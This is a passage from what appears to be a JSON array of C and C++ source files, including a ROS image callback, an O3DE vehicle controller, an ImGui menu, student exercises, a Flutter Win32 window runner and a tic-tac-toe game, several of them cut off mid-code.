cv_ptr->image, compressed_msg.data, params);\n    image_publisher[num].publish(compressed_msg);\n  }\n  catch (cv_bridge::Exception& e)\n  {\n    ROS_ERROR(\"[image] cv_bridge exception: %s\", e.what());\n  }\n}",
    "/*\n * Copyright (c) Contributors to the Open 3D Engine Project.\n * For complete copyright and license terms please see the LICENSE at the root of this distribution.\n *\n * SPDX-License-Identifier: Apache-2.0 OR MIT\n *\n */\n\n#include \"VehicleController.h\"\n\n#include <AzCore/Component/ComponentApplicationBus.h>\n#include <AzCore/Component/Entity.h>\n#include <AzCore/Serialization/EditContext.h>\n#include <AzFramework/Input/Devices/Keyboard/InputDeviceKeyboard.h>\n#include <AzFramework/Physics/RigidBodyBus.h>\n\nnamespace VehicleDynamics\n{\n    VehicleController::VehicleController(const VehicleConfiguration& vehicleControlConfiguration)\n        : m_configuration(vehicleControlConfiguration)\n    {\n    }\n\n    void VehicleController::Reflect(AZ::ReflectContext* context)\n    {\n        VehicleConfiguration::Reflect(context);\n\n        if (auto serialize = azrtti_cast<AZ::SerializeContext*>(context))\n        {\n            serialize->Class<VehicleController, AZ::Component>()->Version(0)->Field(\"Configuration\", &VehicleController::m_configuration);\n        }\n    }\n\n    void VehicleController::Activate()\n    {\n        InputChannelEventListener::Connect();\n        AZ::TickBus::Handler::BusConnect();\n        VehicleDynamicsRequestBus::Handler::BusConnect(GetEntityId());\n    }\n\n    void VehicleController::Deactivate()\n    {\n        InputChannelEventListener::Disconnect();\n        AZ::TickBus::Handler::BusDisconnect();\n        VehicleDynamicsRequestBus::Handler::BusDisconnect();\n    }\n\n    void VehicleController::SetSteeringAngle(const float steeringAngle)\n    {\n        m_steeringTarget = AZ::GetClamp(steeringAngle, -m_maxSteeringAngle, m_maxSteeringAngle);\n    }\n\n    void VehicleController::SetAcceleration(const float acceleration)\n    {\n        m_inputAcceleration = AZ::GetClamp(acceleration, -m_configuration.m_maxAcceleration, m_configuration.m_maxAcceleration);\n    }\n\n    bool VehicleController::OnInputChannelEventFiltered(const AzFramework::InputChannel& inputChannel)\n    {\n        const AzFramework::InputDeviceId& deviceId = inputChannel.GetInputDevice().GetInputDeviceId();\n\n        if (AzFramework::InputDeviceKeyboard::IsKeyboardDevice(deviceId))\n        {\n            OnKeyboardEvent(inputChannel);\n        }\n\n        return false;\n    }\n\n    void VehicleController::OnKeyboardEvent(const AzFramework::InputChannel& inputChannel)\n    {\n        if (m_configuration.m_enableManualControl == false)\n        {\n            return;\n        }\n        const AzFramework::InputChannelId& channelId = inputChannel.GetInputChannelId();\n\n        if (inputChannel.IsStateBegan())\n        {\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowDown)\n            {\n                m_inputAcceleration = -m_configuration.m_maxAcceleration;\n            }\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowUp)\n            {\n                m_inputAcceleration = m_configuration.m_maxAcceleration;\n            }\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowLeft)\n            {\n                m_steeringTarget = m_maxSteeringAngle;\n            }\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowRight)\n            {\n                m_steeringTarget = -m_maxSteeringAngle;\n            }\n        }\n        else if (inputChannel.IsStateEnded())\n        {\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowLeft)\n            {\n                m_steeringTarget = 0.0f;\n            }\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowRight)\n            {\n                m_steeringTarget = 0.0f;\n            }\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowUp)\n            {\n                m_inputAcceleration = 0.0f;\n            }\n            if (channelId == AzFramework::InputDeviceKeyboard::Key::NavigationArrowDown)\n            {\n                m_inputAcceleration = 0.0f;\n            }\n        }\n    }\n\n    WheelController* VehicleController::GetWheelComponent(const AZ::EntityId& wheelId)\n    {\n        AZ::Entity* entity = nullptr;\n        AZ::ComponentApplicationBus::BroadcastResult(entity, &AZ::ComponentApplicationRequests::FindEntity, wheelId);\n        AZ_Error(\"VehicleController\", entity, \"Invalid wheel entity, asset id: %s\", wheelId.ToString().c_str());\n        if (entity)\n        {\n            auto wheel = entity->FindComponent<WheelController>();\n            AZ_Error(\"VehicleController\", wheel, \"Invalid wheel component, asset id: %s\", wheelId.ToString().c_str());\n            return wheel;\n        }\n        return nullptr;\n    }\n\n    void VehicleController::Initialize()\n    {\n        for (const auto& wheelId : m_configuration.m_frontAxleWheelIds)\n        {\n            auto wheel = GetWheelComponent(wheelId);\n            AZ_Assert(wheel, \"Wheel component is null\");\n            if (wheel)\n            {\n                wheel->SetVehicleEntit",
    "#include<iostream>\r\n#include<string>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\tstring name_instructor, your_name, a_food, a_number, an_adjective, a_color, an_animal;\r\n\tint number;\r\n\tcout << \"Name of Instructor: \";\r\n\tcin>>name_instructor;\r\n\r\n\tcout << \"your name: \";\r\n\tcin >> your_name;\r\n\r\n\tcout << \"A food: \";\r\n\tcin >> a_food;\r\n\r\n\tcout << \"A Number between 100 and 120: \";\r\n\tcin >> a_number;\r\n\r\n\tcout << \"An adjective: \";\r\n\tcin >> an_adjective;\r\n\r\n\tcout << \"A color: \";\r\n\tcin >> a_color;\r\n\r\n\tcout << \"An animal: \";\r\n\tcin >> an_animal;\r\n\r\n\tcout << \"\\n\\nDear \" << name_instructor << \",\\n\\n\";\r\n\tcout << \"I am sorry that I am unable to turn in my homework at this time. First, I\\n\";\r\n\tcout << \"ate a rotten \" << a_food << \", which made me turn \" << a_color << \" and extremely ill. I came\\n\";\r\n\tcout << \"down with a fever of \" << a_number << \". Next, my \" << an_adjective << \" pet \" << an_animal << \" must have smelled the\\n\";\r\n\tcout << \"remains of the \" << a_food << \" on my homework, because he ate it. I am currently\\n\"; \r\n\tcout << \"rewriting my homework and hope you will accept it here.\\n\\n\";\r\n\tcout << \"Sincerely,\\n\";\r\n\tcout << your_name << endl;\r\n\r\n\treturn 0;\r\n\r\n}",
    "\ufeff#include \"MyUI.h\"\n\n#include \"imgui.h\"\n#include \"backends/imgui_impl_sdl2.h\"\n#include \"backends/imgui_impl_sdlrenderer2.h\"\n\nvoid MyUI::Init(SDL_Window* window, SDL_Renderer* renderer)\n{\n\t// Setup Dear ImGui context\n\tIMGUI_CHECKVERSION();\n\tImGui::CreateContext();\n\tImGuiIO& io = ImGui::GetIO(); (void)io;\n\tio.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n\tio.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n\tio.ConfigFlags |= ImGuiConfigFlags_DockingEnable;         // Docking\n\tio.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;\n\n\tImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(8.f, 6.f));\n\tImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(10.f, 8.f));\n\tImGui::PushStyleVar(ImGuiStyleVar_ItemInnerSpacing, ImVec2(6.f, 4.f));\n\n\t// Setup Platform/Renderer backends\n\tImGui_ImplSDL2_InitForSDLRenderer(window, renderer);\n\tImGui_ImplSDLRenderer2_Init(renderer);\n}\n\nvoid MyUI::ProcessEvent(SDL_Event event)\n{\n\tImGui_ImplSDL2_ProcessEvent(&event);  // Forward event to imgui backend\n}\n\nvoid MyUI::StartFrame()\n{\n\t// (After event loop)\n\t// Start the Dear ImGui frame\n\tImGui_ImplSDLRenderer2_NewFrame();\n\tImGui_ImplSDL2_NewFrame();\n\tImGui::NewFrame();\n\t//ImGui::DockSpaceOverViewport(0, ImGui::GetMainViewport());\n\t//ImGui::ShowDemoWindow(); // Show demo window! :)\n}\n\nvoid MyUI::DrawMenu(WormOptions::Options* outOptions, std::function<void()> callback)\n{\n\tstatic ImVec4 outlineColor = ImVec4(1.0f, 1.0f, 1.0f, 1.0f);\n\tstatic ImVec4 faceColor = ImVec4(1.0f, 1.0f, 1.0f, 1.0f);\n\n\tstatic bool eyes = false;\n\tstatic bool face = false;\n\n\tImGui::Begin(\"Create a Worm!\", nullptr, ImGuiWindowFlags_AlwaysAutoResize);\n\tImGui::SeparatorText(\"Appearance\");\n\n\tImGui::Text(\"Outline Color:\");\n\tImGui::SameLine();\n\tImGui::ColorEdit3(\"Outline Color\", (float*)&outlineColor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel | ImGuiColorEditFlags_NoDragDrop);\n\t\n\tImGui::Checkbox(\"Eyes\", &eyes);\n\tconst char* eyes_types[] = { \"Default\" };\n\tstatic int eyes_current_idx = -1; // Here we store our selection data as an index.\n\tif (eyes)\n\t{\n\t\t// Pass in the preview value visible before opening the combo (it could technically be different contents or not pulled from items[])\n\t\tconst char* combo_preview_value = eyes_current_idx > -1 ? eyes_types[eyes_current_idx] : \"Choose eyes\";\n\n\t\tif (ImGui::BeginCombo(\"##1\", combo_preview_value))\n\t\t{\n\t\t\tfor (int n = 0; n < IM_ARRAYSIZE(eyes_types); n++)\n\t\t\t{\n\t\t\t\tconst bool is_selected = (eyes_current_idx == n);\n\t\t\t\tif (ImGui::Selectable(eyes_types[n], is_selected))\n\t\t\t\t\teyes_current_idx = n;\n\n\t\t\t\t// Set the initial focus when opening the combo (scrolling + keyboard navigation focus)\n\t\t\t\tif (is_selected)\n\t\t\t\t\tImGui::SetItemDefaultFocus();\n\t\t\t}\n\t\t\tImGui::EndCombo();\n\t\t}\n\t}\n\n\tImGui::Checkbox(\"Face\", &face);\n\tconst char* face_types[] = { \"Smile :)\", \"Wide Smile :D\", \"No Smile :(\"};\n\tstatic int face_current_idx = -1; // Here we store our selection data as an index.\n\tif (face)\n\t{\n\t\t// Pass in the preview value visible before opening the combo (it could technically be different contents or not pulled from items[])\n\t\tconst char* combo_preview_value = face_current_idx > -1 ?  face_types[face_current_idx] : \"Choose face\";\n\n\t\tif (ImGui::BeginCombo(\"##2\", combo_preview_value))\n\t\t{\n\t\t\tfor (int n = 0; n < IM_ARRAYSIZE(face_types); n++)\n\t\t\t{\n\t\t\t\tconst bool is_selected = (face_current_idx == n);\n\t\t\t\tif (ImGui::Selectable(face_types[n], is_selected))\n\t\t\t\t\tface_current_idx = n;\n\n\t\t\t\t// Set the initial focus when opening the combo (scrolling + keyboard navigation focus)\n\t\t\t\tif (is_selected)\n\t\t\t\t\tImGui::SetItemDefaultFocus();\n\t\t\t}\n\t\t\tImGui::EndCombo();\n\t\t}\n\n\t\tImGui::Text(\"Face Color:\");\n\t\tImGui::SameLine();\n\t\tImGui::ColorEdit3(\"Face Color\", (float*)&faceColor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel | ImGuiColorEditFlags_NoDragDrop);\n\n\t}\n\n\tImGui::SeparatorText(\"Size\");\n\tstatic bool autoDistance = outOptions->hasAutoDistance;\n\tstatic float distance = outOptions->distance;\n\tstatic float radius = outOptions->radius;\n\tstatic unsigned int numParticles = outOptions->numParticles;\n\n\tstatic float f_min = 1.f;\n\tstatic float f_max = 100.f;\n\tstatic int i_min = 2;\n\tstatic int i_max = 1024;\n\tImGui::PushItemWidth(60.f);\n\n\tint dragFlags = ImGuiSliderFlags_AlwaysClamp;\n\tImGui::DragScalar(\"Number of particles\", ImGuiDataType_U32, &numParticles, 0.02f, &i_min, &i_max, \"%u\", dragFlags);\n\tImGui::DragScalar(\"Radius of particles\", ImGuiDataType_Float, &radius, 1.f, &f_min, &f_max, \"%.2f\", dragFlags);\n\tImGui::Checkbox(\"Should auto calculate distance?\", &autoDistance);\n\tif (!autoDistance)\n\t{\n\t\tImGui::DragScalar(\"Distance between particles\", ImGuiDataType_Float, &distance, 1.f, &f_min, &f_max, \"%.2f\", dragFlags);\n\t}\n\n\n\n\toutOptions->hasEyes = eyes;\n\toutOptions->hasFace = face;\n\toutOptions->outlineColor = { (Uint8)(outlineColor.x * 255.0f), (Uint8)(outlineColor.y * 255.0f), (Uint8)(outlineColor.z * 255.0f), 255 };\n\toutOptions->faceColor = { (Uint8)(faceColor.x * 255.0f), ",
    "#include <compute_graph/compute_graph.hpp>\n#include <cassert>\n#include <iomanip>\n#include <iostream>\n\nusing namespace compute_graph;\n\nclass ConstantInteger : public NodeDerive<ConstantInteger> {\npublic:\n  CG_NODE_COMMON(ConstantInteger, \"ConstantInteger\", \"Generate a constant integer\");\n  CG_NODE_INPUTS();\n\n  CG_NODE_OUTPUTS((int, value, \"A constant integer.\"));\n\n  void on_construct() {\n    set(out::value, value_);\n  }\n\n  void operator() (Context& ) final { on_construct(); }\n\n  int value_ = 4;\n};\n\n#define DECLARE_BINARY_OP(name, op) \\\n  class name : public NodeDerive<name> { \\\n    public:                                          \\\n      CG_NODE_COMMON(name, #name, \"Binary operation \" #op);\\\n      CG_NODE_INPUTS((int, a, \"The first operand\", 0), (int, b, \"The second operand\", 0)); \\\n      CG_NODE_OUTPUTS((int, result, \"The result of \" #op)); \\\n      void operator() (Context& ) final { set(out::result, get_or(in::a) op get_or(in::b)); } \\\n  }\n\nDECLARE_BINARY_OP(Add, +);\nDECLARE_BINARY_OP(Sub, -);\nDECLARE_BINARY_OP(Mul, *);\nDECLARE_BINARY_OP(Div, /);\n\ntemplate <typename T> auto create_node() { return NodeRegistry::instance().create<T>(); }\n\nint main() {\n  Graph graph;\n  auto add_ab = graph.add(create_node<Add>());\n  auto mul_abc = graph.add(create_node<Mul>());\n\n  auto a = graph.add(create_node<ConstantInteger>()),\n       b = graph.add(create_node<ConstantInteger>()),\n       c = graph.add(create_node<ConstantInteger>());\n  a->value_ = 1;\n  b->value_ = 2;\n\n  graph.connect(a.output(0), add_ab.input(0));\n  graph.connect(b.output(ConstantInteger::out::value), add_ab.input(Add::in::b));\n  graph.connect(add_ab.output(Add::out::result), mul_abc.input(Mul::in::a));\n  graph.connect(c.output(ConstantInteger::out::value), mul_abc.input(Mul::in::b));\n\n  assert(graph.has_connect(*c.output(\"value\"), mul_abc.input(1)));\n\n  graph.topology_sort();\n\n  for (auto const& [nt_ident, node_desc]: NodeRegistry::instance()) {\n    std::cout << \"Node: \" << node_desc.name() << \" (type=\" << to_string(nt_ident)\n              << \", hash=\" << std::hash<utype_ident>{}(nt_ident) << \")\" << std::endl;\n    std::cout << \"  Description: \" << node_desc.desc() << std::endl;\n    std::cout << \"  Inputs:\" << std::endl;\n    for (auto const& sock : node_desc.inputs()) {\n      std::cout << \"    \" << sock.name() << \"(\" << sock.pretty_typename() << \"): \" << sock.desc()\n                << std::endl;\n    }\n    std::cout << \"  Outputs:\" << std::endl;\n    for (auto const& sock : node_desc.outputs()) {\n      std::cout << \"    \" << sock.name() << \"(\" << sock.pretty_typename() << \"): \" << sock.desc()\n                << std::endl;\n    }\n  }\n\n  Context rt;\n  for (auto & node : graph.nodes()) {\n    (*node)(rt);\n  }\n\n  void const* result = mul_abc.output(Mul::out::result)->payload().get();\n  std::cout << \"Result: \" << *static_cast<int const*>(result) << std::endl; // should print 12\n  return EXIT_SUCCESS;\n}\n",
    "/*LALLIER PALLU CARDOSO DE FARIA 1C*/\r\n#include \"conio.h\"\r\n#include \"stdio.h\"\r\n#include \"ctype.h\"\r\n#include \"stdlib.h\"\r\n#include \"locale.h\"\r\n#include \"math.h\"\r\n#include \"string.h\"\r\n#include \"buscas.h\"\r\n// #include \"criptografia.h\"\r\n#include \"ordenacoes.h\"\r\n#define T 1000\r\nFILE *arq;\r\nint dim;\r\n    char nome_arquivo_f(char nome_arquivo[T]){\r\n        getchar();\r\n        printf(\"\\n\\nEntre com o nome do arquivo que sera manipulado: \");\r\n        scanf(\"%[^\\n]s\",nome_arquivo);\r\n    }\r\n    int ler_arquivo(char e,char nome_arquivo[],char mensagem[T],int numeros[T]){\r\n        int i=0,t=0;\r\n        if((arq=fopen(nome_arquivo,\"r\"))==NULL){\r\n            printf(\"\\n\\nEste Arquivo Nao Existe\\n\\n\");\r\n            return -1;\r\n        }\r\n        if(t!=1){\r\n            printf(\"\\n\\nVetor do arquivo %s\\n\",nome_arquivo);\r\n            while(fscanf(arq,\"%c\",&mensagem[i])!=EOF){\r\n                numeros[i]=mensagem[i]-'0';\r\n                i++;\r\n            }\r\n            dim=i-1;\r\n            numeros[i]='*';\r\n            mensagem[i]='\\0';\r\n            getchar();\r\n            for(i=0;numeros[i]!='*';i++){\r\n                if(e=='C')\r\n                    printf(\"%c\",mensagem[i]);\r\n                else\r\n                    printf(\"%d \",numeros[i]);\r\n            }\r\n            fclose(arq);\r\n            return 0;\r\n        }\r\n        getchar();\r\n    }\r\n    int criar_arquivo(char e,char nome_arquivo[T],char mensagem[T],int numeros[T]){\r\n        int i;\r\n        char aux;\r\n        if((arq=fopen(nome_arquivo,\"w\"))==NULL){\r\n            printf(\"Nao posso abrir o arquivo.\");\r\n            exit(0);\r\n        }\r\n        getchar();\r\n        i=0;\r\n        printf(\"\\n\\nEntre com a mensagem que desaja gravar no arquivo \\n\\n\");\r\n        while((aux=getchar())!='\\n'){\r\n            mensagem[i]=aux;\r\n            if(e=='C')\r\n                putc(mensagem[i],arq);\r\n            else{\r\n                numeros[i]=mensagem[i]-'0';\r\n                fprintf(arq,\"%d\",numeros[i]);\r\n            }\r\n            i++;\r\n        }\r\n        numeros[i]='*';\r\n        mensagem[i]='\\0';\r\n        dim=i;\r\n        printf(\"\\n\\nConteudo do arquivo\\n\\t\");\r\n        if(e=='C')\r\n            for(i=0;i<dim;i++)\r\n                printf(\"%c\",mensagem[i]);\r\n        else\r\n            for(i=0;numeros[i]!='*';i++)\r\n                printf(\"%d \",numeros[i]);\r\n        printf(\"\\n\");\r\n        fclose(arq);\r\n        printf(\"\\nArquivo %s gerado com sucesso!!!\",nome_arquivo);\r\n    }\r\n    char escolha_int_char(void){\r\n        int cont=0;\r\n        char e=' ';\r\n        getchar();\r\n        while((e!='N')&&(e!='C')){\r\n            if(cont>0)\r\n                printf(\"\\nOpcao Invalida, tente novamente!\");\r\n            printf(\"\\n\\nO usuario deseja gravar um arquivo de:\\n\\tN-Numeros\\n\\tC-Caracteres\\n\\t  Opcao: \");\r\n            e=toupper(getchar());\r\n            cont++;\r\n        }\r\n        return e;\r\n    }\r\n    int numero_bus(void){\r\n        int e;\r\n        getchar();\r\n        printf(\"\\nEntre com o elemento a ser encontrado = \");\r\n        scanf(\"%d\",&e);\r\n        return e;\r\n    }\r\n    char escolha_busca(int numeros[]){\r\n        char op=' ';\r\n        int vet[T],e,res,i;\r\n        while((op!='L')&&(op!='B')&&(op!='S')){\r\n            printf(\"\\nO usuario deseja fazer qual das buscas?\\n\\tL-Busca Linear\\n\\tB-Busca Binaria\\n\\tS-Voltar para o Menu principal\\n\\t  Opcao: \");\r\n            op=toupper(getchar());\r\n            switch(op){\r\n                case 'L':\r\n                    e=numero_bus();\r\n                    res=bus_lin(e,numeros,vet);\r\n                    if(res==0){\r\n                        printf(\"\\nFoi encontrado o numero %d nas posicoes:\",e);\r\n                        for(i=0; vet[i+1]!='*';i++)\r\n                            printf(\"\\nVetor[%d] = %d\",vet[i],e);\r\n                        printf(\"\\nTotal de numeros encontrados: %d\\n\",vet[i]);\r\n                    }else\r\n                        printf(\"\\nAlgo de errado aconteceu, Verefique!\\n\");\r\n                break;\r\n                case 'B':\r\n                    e=numero_bus();\r\n                    res=bus_bin(e,numeros);\r\n                    switch(res){\r\n                        case (-1):\r\n                            printf(\"\\nVetor com um elemento repetido, Verifique!\");\r\n                        break;\r\n                        case (-2):\r\n                            printf(\"\\nVetor desordenado, Verifique!\");\r\n                        break;\r\n                        case (-3):\r\n                            printf(\"\\nO numero %d nao foi encontrado!\",e);\r\n                        break;\r\n                        default:\r\n                            printf(\"Numero %d encontrado na posicao %d!\\n\",e,res);\r\n                        break;\r\n                    }\r\n                break;\r\n                case 'S': break;\r\n                default: printf(\"\\nOpcao invalida, tente novamente!\\n\"); break;\r\n            }\r\n        }\r\n        getchar();\r\n    }\r\n    char escolha_ordenacao(int numeros[T]){\r\n        char op=' ',nome_arquivo[T];\r\n        int res=0;\r\n        while((op!='",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    Se",
    "#define _CRT_SECURE_NO_WARNINGS\n#include\"game.h\"\nvoid game() {\n\tchar qipan[ROW][COL] = { 0 };\n\tint row = ROW;\n\tint col = COL;\n\tchar c=0;\n\t//\u521d\u59cb\u5316\u68cb\u76d8\n\tInitqipan(qipan, row, col);\n\t//\u6253\u5370\u68cb\u76d8\n\tDisplayqipan(qipan, row, col);\n\twhile (1) {\n\t\t//\u73a9\u5bb6\u4e0b\u68cb\n\t\tPlayer(qipan, row, col);\n\t\tDisplayqipan(qipan, row, col);\n\t\t//\u5224\u65ad\u8f93\u8d62\n\t\tc = Judge(qipan, row, col);\n\t\tif (c!='c')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t\t//\u7535\u8111\u4e0b\u68cb\n\t\tComputer(qipan, row, col);\n\t\t//\u6253\u5370\u68cb\u76d8\n\t\tDisplayqipan(qipan, row, col);\n\t\t//\u5224\u65ad\u8f93\u8d62\n\t\tc = Judge(qipan, row, col);\n\t\tif (c !='c')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (c=='*')\n\t{\n\t\tprintf(\"\u73a9\u5bb6\u8d62\\n\");\n\t}\n\telse if (c=='#')\n\t{\n\t\tprintf(\"\u7535\u8111\u8d62\\n\");\n\t}\n\telse if (c=='q')\n\t{\n\t\tprintf(\"\u5e73\u5c40\\n\");\n\t}\n\tDisplayqipan(qipan, row, col);\n}\n//\u6253\u5370\u83dc\u5355\nvoid menu() {\n\tprintf(\"***************\\n*1.play 0.quit*\\n***************\\n\");\n\n}\nint main() {\n\tint a = 0;\n\tsrand((unsigned int)time(NULL));\n\tdo\n\t{\n\t\tmenu();\n\t\tscanf(\"%d\", &a);\n\t\tswitch (a) {\n\t\tcase 1:\n\t\t\tgame();\n\t\t\tbreak;\n\t\tcase 0:\n\t\t\tprintf(\"\u9000\u51fa\u6e38\u620f\\n\");\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tprintf(\"\u8f93\u5165\u9519\u8bef\uff0c\u91cd\u65b0\u8f93\u5165\\n\");\n\t\t\tbreak;\n\t\t}\n\t} while (a);\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\n// classe base midia\nclass Midia {\npublic:\n    \n    Midia(const string& titulo) : titulo(titulo) {}\n\n    // metodos virtuais\n    virtual void exibirInfo() const = 0;\n    virtual void reproduzir() const = 0;\n\n    virtual ~Midia() = default; // Destruidor virtual para garantir a correta destrui\u00e7\u00e3o de objetos derivados\n\nprotected:\n    string titulo;\n};\n\n// derivada Livro\nclass Livro : public Midia {\npublic:\n    Livro(const string& titulo, const string& autor) : Midia(titulo), autor(autor) {}\n\n    void exibirInfo() const override {\n        cout << \"Livro: \" << titulo << endl;\n        cout << \"Autor: \" << autor << endl;\n    }\n\n    void reproduzir() const override {\n        cout << \"N\u00e3o \u00e9 poss\u00edvel reproduzir um livro.\" << endl;\n    }\n\nprivate:\n    string autor;\n};\n\n// derivada CD\nclass CD : public Midia {\npublic:\n    CD(const string& titulo, const string& artista) : Midia(titulo), artista(artista) {}\n\n    void exibirInfo() const override {\n        cout << \"CD: \" << titulo << endl;\n        cout << \"Artista: \" << artista << endl;\n    }\n\n    void reproduzir() const override {\n        cout << \"Reproduzindo CD: \" << titulo << \" por \" << artista << endl;\n    }\n\nprivate:\n    string artista;\n};\n\n// derivada DVD\nclass DVD : public Midia {\npublic:\n    DVD(const string& titulo, const string& diretor) : Midia(titulo), diretor(diretor) {}\n\n    void exibirInfo() const override {\n        cout << \"DVD: \" << titulo << endl;\n        cout << \"Diretor: \" << diretor << endl;\n    }\n\n    void reproduzir() const override {\n        cout << \"Reproduzindo DVD: \" << titulo << \" dirigido por \" << diretor << endl;\n    }\n\nprivate:\n    string diretor;\n};\n\nint main() {\n    // criando um vetor de ponteiros Midia\n    vector<Midia*> midias;\n\n    // adicionando classes derivadas ao vetor\n    midias.push_back(new Livro(\"Harry Potter\", \"Joanne Jo Rowling\"));\n    midias.push_back(new CD(\"Boate Azul\", \"Leonardo\"));\n    midias.push_back(new DVD(\"Shrek\", \"Dream Works\"));\n\n    // percorrendo o vetor e chamando os m\u00e9todos\n    for (const auto& midia : midias) {\n        midia->exibirInfo();\n        midia->reproduzir();\n        cout << endl;\n    }\n\n    // liberando a mem\u00f3ria\n    for (auto& midia : midias) {\n        delete midia;\n    }\n\n    return 0;\n}\n",
